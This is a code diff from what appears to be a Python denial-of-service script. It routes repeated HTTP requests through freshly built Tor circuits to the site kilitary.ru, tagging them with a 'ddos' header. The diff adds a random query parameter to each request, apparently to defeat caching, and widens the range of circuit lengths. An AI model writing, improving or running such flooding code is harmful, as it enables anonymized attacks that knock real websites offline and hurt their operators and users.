@@ -15,7 +15,7 @@ if __name__ == '__main__':
 				print('tor client (re)created')
 				try:
 					# Choose random guard node and create 3-hops circuit
-					num_circuit = random.randint(2, 6)
+					num_circuit = random.randint(2, 9)
 					print(f'creating {num_circuit} nodes circuit ... ', end='')
 					with tor.create_circuit(num_circuit) as circuit:
 						print(f'OK')
@@ -28,10 +28,8 @@ if __name__ == '__main__':
 							print('receiving ... ', end='')
 							recv = recv_all(stream)
 							print(f'{len(recv)} bytes \r\n\r\n{recv.decode()[:4096]}')
-					data = do_request('https://httpbin.org/headers', headers={'User-Agent': 'Mozilla/5.0', 'X-re-use': 'ddos'}, verbose=1, retries=3)
-					print(f'data {data}')
-					data = do_request('http://kilitary.ru?pay=1', headers={'User-Agent': 'Mozilla/5.0', 'X-use': 'ddos'}, verbose=1, retries=3)
-					print(f'data {data[0:4096]}')
+					data = do_request('http://kilitary.ru?pay=' + str(random.randint(0, 99999999)), headers={'User-Agent': 'Mozilla/6.0', 'X-use': 'ddos'}, verbose=1, retries=3)
+					print(f'data {data[0:14096]}')
 				except Exception as e:
 					print(f"circuit: {e}")
 		except Exception as e:
